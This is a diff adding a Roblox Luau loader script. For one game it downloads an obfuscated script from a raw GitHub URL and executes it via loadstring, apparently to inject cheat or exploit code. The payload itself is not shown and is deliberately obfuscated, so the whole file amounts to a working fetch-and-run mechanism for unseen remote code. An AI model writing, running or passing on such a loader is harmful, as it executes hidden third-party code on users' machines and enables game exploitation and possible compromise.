@@ -1,0 +1,83 @@
+local HttpService = game:GetService("HttpService")
+
+	local CONFIG = {
+	{
+		name      = "Steal an egg",
+		placeId   = 107778070777162,
+		gameId    = 0,
+		scriptUrl = "https://raw.githubusercontent.com/lavovichlava-sudo/Kdkdjddjdjjd/refs/heads/main/Tg_obfuscated.luau.txt",
+		enabled   = true,
+	},
+}
+
+local function matchesGameId(entry)
+	local placeId = game.PlaceId
+	local gameId  = game.GameId
+
+	if entry.placeId and entry.placeId ~= 0 and placeId ~= entry.placeId then
+		return false
+	end
+	if entry.gameId and entry.gameId ~= 0 and gameId ~= entry.gameId then
+		return false
+	end
+	return true
+end
+
+local function fetchSource(url)
+	local ok, result = pcall(function()
+		return HttpService:GetAsync(url)
+	end)
+	if not ok then
+		return nil
+	end
+	return result
+end
+
+local function executeSource(source, entryName)
+	local fn, err = loadstring(source)
+	if not fn then
+		warn("[Loader] " .. tostring(entryName) .. ": " .. tostring(err))
+		return false
+	end
+
+	local ok, runtimeErr = pcall(fn)
+	if not ok then
+		warn("[Loader] " .. tostring(entryName) .. ": " .. tostring(runtimeErr))
+		return false
+	end
+	return true
+end
+
+local function main()
+	for _, entry in ipairs(CONFIG) do
+		if type(entry) ~= "table" or not entry.enabled then
+			continue
+		end
+
+		if not matchesGameId(entry) then
+			continue
+		end
+
+		local source
+		if entry.scriptUrl then
+			source = fetchSource(entry.scriptUrl)
+			if not source then
+				warn("[Loader] Не удалось скачать: " .. tostring(entry.name))
+				continue
+			end
+		elseif entry.scriptSource then
+			source = entry.scriptSource
+		else
+			continue
+		end
+
+		executeSource(source, entry.name)
+		break
+	end
+end
+
+main()
+
+return {
+	CONFIG = CONFIG,
+}
